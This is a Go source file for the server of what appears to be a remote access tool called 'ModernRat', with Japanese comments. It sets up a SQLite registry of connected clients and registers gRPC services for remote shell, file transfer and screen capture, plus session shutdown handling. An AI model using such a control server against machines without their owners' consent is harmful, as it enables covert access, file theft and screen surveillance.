package main

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	_ "github.com/mattn/go-sqlite3"
	pb "modernrat-server/gen"
	storage "modernrat-server/internal/storage"

	"google.golang.org/grpc"
)

const (
	defaultListenAddr = ":50051"
	defaultDBPath     = "modernrat_users.db"
)

type serverConfig struct {
	listenAddr    string
	databasePath  string
	jwtSecret     []byte
	adminPassword []byte
}

// server は UserRegistrationService を実装する
type server struct {
	pb.UnimplementedUserRegistrationServiceServer
	pb.UnimplementedAdminServiceServer
	pb.UnimplementedRemoteShellServiceServer
	pb.UnimplementedFileTransferServiceServer
	pb.UnimplementedScreenCaptureServiceServer
	// db はユーザーデータを永続化する SQLite データベース
	db            *sql.DB
	jwtSecret     []byte
	adminPassword []byte
	shellHub      *shellHub
	users         storage.UserRepository
	fileHub       *fileHub
	captureHub    *captureHub
}

// ensureSchema は必要なテーブルを作成してスキーマを保証する
func ensureSchema(ctx context.Context, db *sql.DB) error {
	_, err := db.ExecContext(ctx, `
		CREATE TABLE IF NOT EXISTS users (
			user_id TEXT PRIMARY KEY,
			system_info BLOB NOT NULL,
			registered_at INTEGER NOT NULL,
			last_seen INTEGER NOT NULL,
			is_online INTEGER NOT NULL,
			client_secret_hash TEXT NOT NULL DEFAULT ''
		)
	`)
	if err != nil {
		return err
	}
	return ensureColumnExists(ctx, db, "users", "client_secret_hash", "TEXT", "''")
}

func ensureColumnExists(ctx context.Context, db *sql.DB, table, column, columnType, defaultValue string) error {
	query := "PRAGMA table_info(" + table + ")"
	rows, err := db.QueryContext(ctx, query)
	if err != nil {
		return err
	}
	defer rows.Close()

	exists := false
	for rows.Next() {
		var (
			cid      int
			name     string
			typeName string
			notNull  int
			defaultV sql.NullString
			pk       int
		)
		if scanErr := rows.Scan(&cid, &name, &typeName, &notNull, &defaultV, &pk); scanErr != nil {
			return scanErr
		}
		if strings.EqualFold(name, column) {
			exists = true
			break
		}
	}

	if exists {
		return nil
	}

	alter := "ALTER TABLE " + table + " ADD COLUMN " + column + " " + columnType
	if defaultValue != "" {
		alter += " DEFAULT " + defaultValue
	}
	if _, err := db.ExecContext(ctx, alter); err != nil {
		return err
	}
	if defaultValue != "" {
		update := "UPDATE " + table + " SET " + column + " = " + defaultValue + " WHERE " + column + " IS NULL OR " + column + " = ''"
		if _, err := db.ExecContext(ctx, update); err != nil {
			return err
		}
	}
	return nil
}

func main() {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	cfg, err := loadConfig()
	if err != nil {
		log.Fatalf("設定読み込み失敗: %v", err)
	}

	if err := run(ctx, cfg); err != nil {
		log.Fatalf("サーバー起動失敗: %v", err)
	}
}

func loadConfig() (serverConfig, error) {
	listen := strings.TrimSpace(os.Getenv("SERVER_LISTEN_ADDR"))
	if listen == "" {
		listen = strings.TrimSpace(os.Getenv("SERVER_PORT"))
	}
	if listen == "" {
		listen = defaultListenAddr
	}
	listen = normalizeListenAddr(listen)

	dbPath := strings.TrimSpace(os.Getenv("DB_PATH"))
	if dbPath == "" {
		dbPath = defaultDBPath
	}

	jwtSecret := os.Getenv("JWT_SECRET")
	if jwtSecret == "" {
		return serverConfig{}, errors.New("JWT_SECRET が設定されていません")
	}

	adminPassword := os.Getenv("ADMIN_PASSWORD")
	if adminPassword == "" {
		return serverConfig{}, errors.New("ADMIN_PASSWORD が設定されていません")
	}

	return serverConfig{
		listenAddr:    listen,
		databasePath:  dbPath,
		jwtSecret:     []byte(jwtSecret),
		adminPassword: []byte(adminPassword),
	}, nil
}

func normalizeListenAddr(value string) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return defaultListenAddr
	}
	if strings.HasPrefix(trimmed, "unix:") || strings.HasPrefix(trimmed, "unix@") {
		return trimmed
	}
	if strings.HasPrefix(trimmed, ":") || strings.Contains(trimmed, ":") {
		return trimmed
	}
	return ":" + trimmed
}

func run(ctx context.Context, cfg serverConfig) error {
	lis, err := net.Listen("tcp", cfg.listenAddr)
	if err != nil {
		return fmt.Errorf("リスナー作成失敗: %w", err)
	}
	defer lis.Close()

	db, err := openDatabase(ctx, cfg.databasePath)
	if err != nil {
		return err
	}
	defer db.Close()

	grpcServer := grpc.NewServer()
	svc := newServerInstance(db, cfg)
	pb.RegisterUserRegistrationServiceServer(grpcServer, svc)
	pb.RegisterAdminServiceServer(grpcServer, svc)
	pb.RegisterRemoteShellServiceServer(grpcServer, svc)
	pb.RegisterFileTransferServiceServer(grpcServer, svc)
	pb.RegisterScreenCaptureServiceServer(grpcServer, svc)

	errCh := make(chan error, 1)
	go func() {
		errCh <- grpcServer.Serve(lis)
	}()

	log.Printf("ModernRat Server が %s で起動しました", cfg.listenAddr)
	log.Println("接続待機中...")

	select {
	case <-ctx.Done():
		log.Println("シャットダウン要求を受信しました")
		svc.shutdownShellSessions("server shutting down")
		svc.shutdownFileTransfers("server shutting down")
		svc.shutdownCaptureSessions("server shutting down")
		shutdown(grpcServer)
		if serveErr := <-errCh; serveErr != nil && !errors.Is(serveErr, grpc.ErrServerStopped) {
			return serveErr
		}
		log.Println("サーバーを正常に停止しました")
		return nil
	case serveErr := <-errCh:
		if errors.Is(serveErr, grpc.ErrServerStopped) {
			return nil
		}
		return serveErr
	}
}

func openDatabase(ctx context.Context, path string) (*sql.DB, error) {
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return nil, fmt.Errorf("データベース接続失敗: %w", err)
	}

	db.SetMaxOpenConns(1)
	db.SetMaxIdleConns(1)

	if err := ensureSchema(ctx, db); err != nil {
		db.Close()
		return nil, fmt.Errorf("データベース初期化失敗: %w", err)
	}
	return db, nil
}

func newServerInstance(db *sql.DB, cfg serverConfig) *server {
	return &server{
		db:            db,
		jwtSecret:     cfg.jwtSecret,
		adminPassword: cfg.adminPassword,
		shellHub:      newShellHub(),
		users:         storage.NewSQLiteUserRepository(db),
		fileHub:       newFileHub(),
		captureHub:    newCaptureHub(),
	}
}

func (s *server) shutdownShellSessions(reason string) {
	sessions := s.shellHub.endAllSessions()
	if len(sessions) > 0 {
		log.Printf("停止前に %d 件のシェルセッションを終了します: reason=%s", len(sessions), reason)
	}

	for _, session := range sessions {
		s.broadcastSessionClose(session, reason)
		if session.clientConn != nil {
			session.clientConn.Close()
		}
		if session.adminConn != nil {
			session.adminConn.Close()
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	if _, err := s.db.ExecContext(ctx, `UPDATE users SET is_online = 0 WHERE is_online = 1`); err != nil {
		log.Printf("ユーザー状態のリセットに失敗: %v", err)
	}
}

func (s *server) shutdownFileTransfers(reason string) {
	sessions := s.fileHub.endAllSessions()
	if len(sessions) > 0 {
		log.Printf("停止前に %d 件のファイル転送セッションを終了します: reason=%s", len(sessions), reason)
	}

	for _, session := range sessions {
		msg := &pb.FileTransferMessage{
			TransferId: session.id,
			UserId:     session.userID,
			Type:       pb.FileTransferMessageType_FILE_TRANSFER_MESSAGE_TYPE_CANCEL,
			Text:       reason,
		}

		if session.clientConn != nil {
			_ = session.clientConn.Send(msg)
			session.clientConn.Close()
		}
		if session.adminConn != nil {
			_ = session.adminConn.Send(msg)
			session.adminConn.Close()
		}
	}
}

func (s *server) shutdownCaptureSessions(reason string) {
	sessions := s.captureHub.endAllSessions()
	if len(sessions) == 0 {
		return
	}

	log.Printf("停止前に %d 件のスクリーンキャプチャセッションを終了します: reason=%s", len(sessions), reason)

	for _, session := range sessions {
		stopMsg := &pb.ScreenCaptureMessage{
			Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP,
			SessionId: session.id,
			UserId:    session.userID,
			Text:      reason,
			Timestamp: time.Now().Unix(),
		}
		if session.clientConn != nil {
			if err := session.clientConn.Send(stopMsg); err != nil {
				log.Printf("スクリーンキャプチャ停止通知の送信に失敗: user=%s session=%s err=%v", session.userID, session.id, err)
			}
			session.clientConn.Close()
		}

		notify := &pb.ScreenCaptureMessage{
			Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
			SessionId: session.id,
			UserId:    session.userID,
			Text:      reason,
			Timestamp: time.Now().Unix(),
		}
		if session.adminConn != nil {
			_ = session.adminConn.Send(notify)
			session.adminConn.Close()
		}
	}
}

func shutdown(srv *grpc.Server) {
	done := make(chan struct{})
	go func() {
		srv.GracefulStop()
		close(done)
	}()

	select {
	case <-done:
		return
	case <-time.After(5 * time.Second):
		log.Println("GracefulStop に時間がかかりすぎています。強制停止します。")
		srv.Stop()
	}
}
